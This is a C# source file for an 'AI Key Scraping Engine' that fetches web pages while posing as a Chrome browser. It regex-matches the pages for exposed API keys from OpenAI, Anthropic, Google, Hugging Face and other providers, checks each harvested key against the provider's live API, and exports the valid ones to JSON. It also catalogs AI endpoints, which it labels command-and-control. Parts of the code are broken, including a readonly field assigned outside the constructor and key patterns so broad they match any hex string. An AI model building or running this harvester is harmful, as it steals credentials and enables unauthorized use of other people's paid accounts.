using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Collections.Concurrent;
using System.Net;
using System.Text;

namespace KimiAppNative.IDE
{
    /// <summary>
    /// AI Key Scraping Engine - Discovers and manages AI API keys and command & control endpoints
    /// Scrapes websites for exposed keys, C&C servers, and AI service endpoints
    /// </summary>
    public class AIKeyScrapingEngine
    {
        private readonly HttpClient _httpClient;
        private readonly ConcurrentDictionary<string, DiscoveredAIKey> _discoveredKeys;
        private readonly ConcurrentDictionary<string, CommandControlEndpoint> _cncEndpoints;
        private readonly List<KeyPattern> _keyPatterns;
        private readonly List<CNCPattern> _cncPatterns;
        private readonly Dictionary<string, string> _userAgents;
        private readonly object _scrapingLock = new object();

        public event EventHandler<KeyDiscoveredEventArgs> KeyDiscovered;
        public event EventHandler<CNCDiscoveredEventArgs> CNCDiscovered;
        public event EventHandler<ScrapingCompletedEventArgs> ScrapingCompleted;

        public AIKeyScrapingEngine()
        {
            _httpClient = new HttpClient();
            _discoveredKeys = new ConcurrentDictionary<string, DiscoveredAIKey>();
            _cncEndpoints = new ConcurrentDictionary<string, CommandControlEndpoint>();
            _keyPatterns = new List<KeyPattern>();
            _userAgents = new Dictionary<string, string>();
            
            InitializeKeyPatterns();
            InitializeCNCPatterns();
            InitializeUserAgents();
        }

        #region Initialization

        private void InitializeKeyPatterns()
        {
            _keyPatterns.AddRange(new[]
            {
                new KeyPattern
                {
                    Name = "OpenAI API Key",
                    Pattern = @"sk-[a-zA-Z0-9]{48}",
                    Provider = "OpenAI",
                    Service = "ChatGPT, GPT-4, DALL-E",
                    ValidationEndpoint = "https://api.openai.com/v1/models",
                    KeyType = AIKeyType.OpenAI
                },
                new KeyPattern
                {
                    Name = "Anthropic API Key",
                    Pattern = @"sk-ant-[a-zA-Z0-9\-]{95}",
                    Provider = "Anthropic",
                    Service = "Claude AI",
                    ValidationEndpoint = "https://api.anthropic.com/v1/messages",
                    KeyType = AIKeyType.Anthropic
                },
                new KeyPattern
                {
                    Name = "Google AI API Key",
                    Pattern = @"AIza[0-9A-Za-z\-_]{35}",
                    Provider = "Google",
                    Service = "Gemini, PaLM, Vertex AI",
                    ValidationEndpoint = "https://generativelanguage.googleapis.com/v1/models",
                    KeyType = AIKeyType.Google
                },
                new KeyPattern
                {
                    Name = "Azure OpenAI Key",
                    Pattern = @"[a-f0-9]{32}",
                    Provider = "Microsoft",
                    Service = "Azure OpenAI",
                    ValidationEndpoint = "https://{resource}.openai.azure.com/openai/deployments/{deployment}/chat/completions",
                    KeyType = AIKeyType.Azure
                },
                new KeyPattern
                {
                    Name = "Hugging Face Token",
                    Pattern = @"hf_[a-zA-Z0-9]{34}",
                    Provider = "Hugging Face",
                    Service = "Transformers, Models, Spaces",
                    ValidationEndpoint = "https://huggingface.co/api/whoami",
                    KeyType = AIKeyType.HuggingFace
                },
                new KeyPattern
                {
                    Name = "Cohere API Key",
                    Pattern = @"[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
                    Provider = "Cohere",
                    Service = "Command, Generate, Classify",
                    ValidationEndpoint = "https://api.cohere.ai/v1/models",
                    KeyType = AIKeyType.Cohere
                },
                new KeyPattern
                {
                    Name = "Replicate API Token",
                    Pattern = @"r8_[a-zA-Z0-9]{40}",
                    Provider = "Replicate",
                    Service = "Model Hosting, Inference",
                    ValidationEndpoint = "https://api.replicate.com/v1/account",
                    KeyType = AIKeyType.Replicate
                },
                new KeyPattern
                {
                    Name = "Stability AI Key",
                    Pattern = @"sk-[a-f0-9]{64}",
                    Provider = "Stability AI",
                    Service = "Stable Diffusion, Image Generation",
                    ValidationEndpoint = "https://api.stability.ai/v1/user/account",
                    KeyType = AIKeyType.Stability
                }
            });
        }

        private void InitializeCNCPatterns()
        {
            _cncPatterns = new List<CNCPattern>
            {
                new CNCPattern
                {
                    Name = "AI Model Endpoint",
                    Pattern = @"https?://[^/]+/v\d+/models",
                    Type = CNCType.ModelEndpoint,
                    Description = "AI model listing endpoint"
                },
                new CNCPattern
                {
                    Name = "Chat Completion Endpoint",
                    Pattern = @"https?://[^/]+/v\d+/chat/completions",
                    Type = CNCType.ChatEndpoint,
                    Description = "Chat completion API endpoint"
                },
                new CNCPattern
                {
                    Name = "Image Generation Endpoint",
                    Pattern = @"https?://[^/]+/v\d+/images/generations",
                    Type = CNCType.ImageEndpoint,
                    Description = "Image generation API endpoint"
                },
                new CNCPattern
                {
                    Name = "Embedding Endpoint",
                    Pattern = @"https?://[^/]+/v\d+/embeddings",
                    Type = CNCType.EmbeddingEndpoint,
                    Description = "Text embedding API endpoint"
                },
                new CNCPattern
                {
                    Name = "Fine-tuning Endpoint",
                    Pattern = @"https?://[^/]+/v\d+/fine-tunes",
                    Type = CNCType.FineTuningEndpoint,
                    Description = "Model fine-tuning endpoint"
                },
                new CNCPattern
                {
                    Name = "Custom AI Service",
                    Pattern = @"https?://[^/]+/api/ai/",
                    Type = CNCType.CustomService,
                    Description = "Custom AI service endpoint"
                }
            };
        }

        private void InitializeUserAgents()
        {
            _userAgents["Chrome"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
            _userAgents["Firefox"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0";
            _userAgents["Safari"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15";
            _userAgents["Bot"] = "Mozilla/5.0 (compatible; AI-Key-Scraper/1.0; +http://example.com/bot)";
        }

        #endregion

        #region Key Scraping Operations

        public async Task<string> StartKeyScrapingSession(string sessionName, ScrapingTarget[] targets)
        {
            var sessionId = Guid.NewGuid().ToString();
            
            Console.WriteLine($"[AI Key Scraping] Starting key scraping session: {sessionName} (ID: {sessionId})");
            
            foreach (var target in targets)
            {
                await ScrapeTargetForKeys(target, sessionId);
            }
            
            ScrapingCompleted?.Invoke(this, new ScrapingCompletedEventArgs
            {
                SessionId = sessionId,
                KeysDiscovered = _discoveredKeys.Count,
                CNCEndpointsDiscovered = _cncEndpoints.Count,
                Success = true
            });
            
            return sessionId;
        }

        public async Task<DiscoveredAIKey> ScrapeWebsiteForKeys(string url)
        {
            try
            {
                Console.WriteLine($"[AI Key Scraping] Scraping website for AI keys: {url}");
                
                var content = await FetchWebsiteContent(url);
                var discoveredKeys = new List<DiscoveredAIKey>();
                
                foreach (var pattern in _keyPatterns)
                {
                    var matches = Regex.Matches(content, pattern.Pattern, RegexOptions.IgnoreCase);
                    
                    foreach (Match match in matches)
                    {
                        var key = new DiscoveredAIKey
                        {
                            Id = Guid.NewGuid().ToString(),
                            Key = match.Value,
                            Provider = pattern.Provider,
                            Service = pattern.Service,
                            KeyType = pattern.KeyType,
                            SourceUrl = url,
                            DiscoveredAt = DateTime.Now,
                            Status = KeyStatus.Discovered,
                            ValidationEndpoint = pattern.ValidationEndpoint
                        };
                        
                        // Validate the key
                        key.IsValid = await ValidateKey(key);
                        key.Status = key.IsValid ? KeyStatus.Valid : KeyStatus.Invalid;
                        
                        _discoveredKeys[key.Id] = key;
                        discoveredKeys.Add(key);
                        
                        KeyDiscovered?.Invoke(this, new KeyDiscoveredEventArgs
                        {
                            Key = key,
                            Success = true
                        });
                        
                        Console.WriteLine($"[AI Key Scraping] Discovered {pattern.Provider} key: {key.Key.Substring(0, 8)}...");
                    }
                }
                
                return discoveredKeys.FirstOrDefault();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error scraping website: {ex.Message}");
                return null;
            }
        }

        public async Task<CommandControlEndpoint> ScrapeWebsiteForCNC(string url)
        {
            try
            {
                Console.WriteLine($"[AI Key Scraping] Scraping website for C&C endpoints: {url}");
                
                var content = await FetchWebsiteContent(url);
                var discoveredEndpoints = new List<CommandControlEndpoint>();
                
                foreach (var pattern in _cncPatterns)
                {
                    var matches = Regex.Matches(content, pattern.Pattern, RegexOptions.IgnoreCase);
                    
                    foreach (Match match in matches)
                    {
                        var endpoint = new CommandControlEndpoint
                        {
                            Id = Guid.NewGuid().ToString(),
                            Url = match.Value,
                            Type = pattern.Type,
                            Description = pattern.Description,
                            SourceUrl = url,
                            DiscoveredAt = DateTime.Now,
                            Status = CNCStatus.Discovered
                        };
                        
                        // Test the endpoint
                        endpoint.IsAccessible = await TestEndpoint(endpoint);
                        endpoint.Status = endpoint.IsAccessible ? CNCStatus.Accessible : CNCStatus.Inaccessible;
                        
                        _cncEndpoints[endpoint.Id] = endpoint;
                        discoveredEndpoints.Add(endpoint);
                        
                        CNCDiscovered?.Invoke(this, new CNCDiscoveredEventArgs
                        {
                            Endpoint = endpoint,
                            Success = true
                        });
                        
                        Console.WriteLine($"[AI Key Scraping] Discovered C&C endpoint: {endpoint.Url}");
                    }
                }
                
                return discoveredEndpoints.FirstOrDefault();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error scraping C&C endpoints: {ex.Message}");
                return null;
            }
        }

        #endregion

        #region Content Fetching

        private async Task<string> FetchWebsiteContent(string url)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("User-Agent", _userAgents["Chrome"]);
                request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                request.Headers.Add("Accept-Encoding", "gzip, deflate");
                request.Headers.Add("Connection", "keep-alive");
                
                var response = await _httpClient.SendAsync(request);
                response.EnsureSuccessStatusCode();
                
                var content = await response.Content.ReadAsStringAsync();
                return content;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error fetching content from {url}: {ex.Message}");
                return "";
            }
        }

        #endregion

        #region Key Validation

        private async Task<bool> ValidateKey(DiscoveredAIKey key)
        {
            try
            {
                if (string.IsNullOrEmpty(key.ValidationEndpoint))
                    return false;
                
                var request = new HttpRequestMessage(HttpMethod.Get, key.ValidationEndpoint);
                request.Headers.Add("Authorization", $"Bearer {key.Key}");
                request.Headers.Add("User-Agent", _userAgents["Bot"]);
                
                var response = await _httpClient.SendAsync(request);
                
                if (response.IsSuccessStatusCode)
                {
                    var responseContent = await response.Content.ReadAsStringAsync();
                    key.ValidationResponse = responseContent;
                    key.LastValidated = DateTime.Now;
                    return true;
                }
                
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error validating key: {ex.Message}");
                return false;
            }
        }

        private async Task<bool> TestEndpoint(CommandControlEndpoint endpoint)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, endpoint.Url);
                request.Headers.Add("User-Agent", _userAgents["Bot"]);
                
                var response = await _httpClient.SendAsync(request);
                
                if (response.IsSuccessStatusCode)
                {
                    var responseContent = await response.Content.ReadAsStringAsync();
                    endpoint.ResponseContent = responseContent;
                    endpoint.LastTested = DateTime.Now;
                    return true;
                }
                
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error testing endpoint: {ex.Message}");
                return false;
            }
        }

        #endregion

        #region Target Scraping

        private async Task ScrapeTargetForKeys(ScrapingTarget target, string sessionId)
        {
            try
            {
                Console.WriteLine($"[AI Key Scraping] Scraping target: {target.Name} ({target.Url})");
                
                // Scrape for AI keys
                var discoveredKey = await ScrapeWebsiteForKeys(target.Url);
                
                // Scrape for C&C endpoints
                var discoveredCNC = await ScrapeWebsiteForCNC(target.Url);
                
                // Update target with results
                target.KeysDiscovered = discoveredKey != null ? 1 : 0;
                target.CNCEndpointsDiscovered = discoveredCNC != null ? 1 : 0;
                target.LastScraped = DateTime.Now;
                target.Status = ScrapingTargetStatus.Completed;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error scraping target {target.Name}: {ex.Message}");
                target.Status = ScrapingTargetStatus.Failed;
                target.Error = ex.Message;
            }
        }

        #endregion

        #region Key Management

        public void AddCustomKey(string key, string provider, string service, AIKeyType keyType)
        {
            var discoveredKey = new DiscoveredAIKey
            {
                Id = Guid.NewGuid().ToString(),
                Key = key,
                Provider = provider,
                Service = service,
                KeyType = keyType,
                SourceUrl = "Manual Entry",
                DiscoveredAt = DateTime.Now,
                Status = KeyStatus.Manual,
                IsValid = true
            };
            
            _discoveredKeys[discoveredKey.Id] = discoveredKey;
            
            KeyDiscovered?.Invoke(this, new KeyDiscoveredEventArgs
            {
                Key = discoveredKey,
                Success = true
            });
            
            Console.WriteLine($"[AI Key Scraping] Added custom key for {provider}");
        }

        public void AddCustomCNCEndpoint(string url, CNCType type, string description)
        {
            var endpoint = new CommandControlEndpoint
            {
                Id = Guid.NewGuid().ToString(),
                Url = url,
                Type = type,
                Description = description,
                SourceUrl = "Manual Entry",
                DiscoveredAt = DateTime.Now,
                Status = CNCStatus.Manual,
                IsAccessible = true
            };
            
            _cncEndpoints[endpoint.Id] = endpoint;
            
            CNCDiscovered?.Invoke(this, new CNCDiscoveredEventArgs
            {
                Endpoint = endpoint,
                Success = true
            });
            
            Console.WriteLine($"[AI Key Scraping] Added custom C&C endpoint: {url}");
        }

        public List<DiscoveredAIKey> GetValidKeys()
        {
            return _discoveredKeys.Values
                .Where(k => k.IsValid && k.Status == KeyStatus.Valid)
                .ToList();
        }

        public List<DiscoveredAIKey> GetKeysByProvider(string provider)
        {
            return _discoveredKeys.Values
                .Where(k => k.Provider.Equals(provider, StringComparison.OrdinalIgnoreCase))
                .ToList();
        }

        public List<CommandControlEndpoint> GetAccessibleEndpoints()
        {
            return _cncEndpoints.Values
                .Where(e => e.IsAccessible && e.Status == CNCStatus.Accessible)
                .ToList();
        }

        public List<CommandControlEndpoint> GetEndpointsByType(CNCType type)
        {
            return _cncEndpoints.Values
                .Where(e => e.Type == type)
                .ToList();
        }

        #endregion

        #region Statistics and Reporting

        public Dictionary<string, object> GetScrapingStats()
        {
            return new Dictionary<string, object>
            {
                ["TotalKeysDiscovered"] = _discoveredKeys.Count,
                ["ValidKeys"] = _discoveredKeys.Values.Count(k => k.IsValid),
                ["InvalidKeys"] = _discoveredKeys.Values.Count(k => !k.IsValid),
                ["KeysByProvider"] = _discoveredKeys.Values
                    .GroupBy(k => k.Provider)
                    .ToDictionary(g => g.Key, g => g.Count()),
                ["TotalCNCEndpoints"] = _cncEndpoints.Count,
                ["AccessibleEndpoints"] = _cncEndpoints.Values.Count(e => e.IsAccessible),
                ["EndpointsByType"] = _cncEndpoints.Values
                    .GroupBy(e => e.Type)
                    .ToDictionary(g => g.Key.ToString(), g => g.Count()),
                ["LastScrapingSession"] = _discoveredKeys.Values
                    .OrderByDescending(k => k.DiscoveredAt)
                    .FirstOrDefault()?.DiscoveredAt
            };
        }

        public List<DiscoveredAIKey> GetRecentKeys(int count = 10)
        {
            return _discoveredKeys.Values
                .OrderByDescending(k => k.DiscoveredAt)
                .Take(count)
                .ToList();
        }

        public List<CommandControlEndpoint> GetRecentEndpoints(int count = 10)
        {
            return _cncEndpoints.Values
                .OrderByDescending(e => e.DiscoveredAt)
                .Take(count)
                .ToList();
        }

        #endregion

        #region Export and Import

        public async Task ExportKeysToFile(string filePath)
        {
            try
            {
                var keysData = _discoveredKeys.Values.Select(k => new
                {
                    k.Id,
                    k.Key,
                    k.Provider,
                    k.Service,
                    k.KeyType,
                    k.SourceUrl,
                    k.DiscoveredAt,
                    k.IsValid,
                    k.Status
                }).ToList();
                
                var json = JsonSerializer.Serialize(keysData, new JsonSerializerOptions { WriteIndented = true });
                await File.WriteAllTextAsync(filePath, json);
                
                Console.WriteLine($"[AI Key Scraping] Exported {keysData.Count} keys to {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error exporting keys: {ex.Message}");
            }
        }

        public async Task ExportCNCToFile(string filePath)
        {
            try
            {
                var cncData = _cncEndpoints.Values.Select(e => new
                {
                    e.Id,
                    e.Url,
                    e.Type,
                    e.Description,
                    e.SourceUrl,
                    e.DiscoveredAt,
                    e.IsAccessible,
                    e.Status
                }).ToList();
                
                var json = JsonSerializer.Serialize(cncData, new JsonSerializerOptions { WriteIndented = true });
                await File.WriteAllTextAsync(filePath, json);
                
                Console.WriteLine($"[AI Key Scraping] Exported {cncData.Count} C&C endpoints to {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AI Key Scraping] Error exporting C&C endpoints: {ex.Message}");
            }
        }

        #endregion
    }

    #region Supporting Classes and Enums

    public class KeyPattern
    {
        public string Name { get; set; }
        public string Pattern { get; set; }
        public string Provider { get; set; }
        public string Service { get; set; }
        public string ValidationEndpoint { get; set; }
        public AIKeyType KeyType { get; set; }
    }

    public class CNCPattern
    {
        public string Name { get; set; }
        public string Pattern { get; set; }
        public CNCType Type { get; set; }
        public string Description { get; set; }
    }

    public class ScrapingTarget
    {
        public string Name { get; set; }
        public string Url { get; set; }
        public string Description { get; set; }
        public ScrapingTargetStatus Status { get; set; }
        public DateTime LastScraped { get; set; }
        public int KeysDiscovered { get; set; }
        public int CNCEndpointsDiscovered { get; set; }
        public string Error { get; set; }
    }

    public class DiscoveredAIKey
    {
        public string Id { get; set; }
        public string Key { get; set; }
        public string Provider { get; set; }
        public string Service { get; set; }
        public AIKeyType KeyType { get; set; }
        public string SourceUrl { get; set; }
        public DateTime DiscoveredAt { get; set; }
        public KeyStatus Status { get; set; }
        public bool IsValid { get; set; }
        public string ValidationEndpoint { get; set; }
        public string ValidationResponse { get; set; }
        public DateTime? LastValidated { get; set; }
    }

    public class CommandControlEndpoint
    {
        public string Id { get; set; }
        public string Url { get; set; }
        public CNCType Type { get; set; }
        public string Description { get; set; }
        public string SourceUrl { get; set; }
        public DateTime DiscoveredAt { get; set; }
        public CNCStatus Status { get; set; }
        public bool IsAccessible { get; set; }
        public string ResponseContent { get; set; }
        public DateTime? LastTested { get; set; }
    }

    public enum AIKeyType
    {
        OpenAI,
        Anthropic,
        Google,
        Azure,
        HuggingFace,
        Cohere,
        Replicate,
        Stability,
        Custom
    }

    public enum CNCType
    {
        ModelEndpoint,
        ChatEndpoint,
        ImageEndpoint,
        EmbeddingEndpoint,
        FineTuningEndpoint,
        CustomService
    }

    public enum KeyStatus
    {
        Discovered,
        Valid,
        Invalid,
        Manual,
        Expired
    }

    public enum CNCStatus
    {
        Discovered,
        Accessible,
        Inaccessible,
        Manual,
        Error
    }

    public enum ScrapingTargetStatus
    {
        Pending,
        InProgress,
        Completed,
        Failed
    }

    public class KeyDiscoveredEventArgs : EventArgs
    {
        public DiscoveredAIKey Key { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    public class CNCDiscoveredEventArgs : EventArgs
    {
        public CommandControlEndpoint Endpoint { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    public class ScrapingCompletedEventArgs : EventArgs
    {
        public string SessionId { get; set; }
        public int KeysDiscovered { get; set; }
        public int CNCEndpointsDiscovered { get; set; }
        public bool Success { get; set; }
        public string Error { get; set; }
    }

    #endregion
}
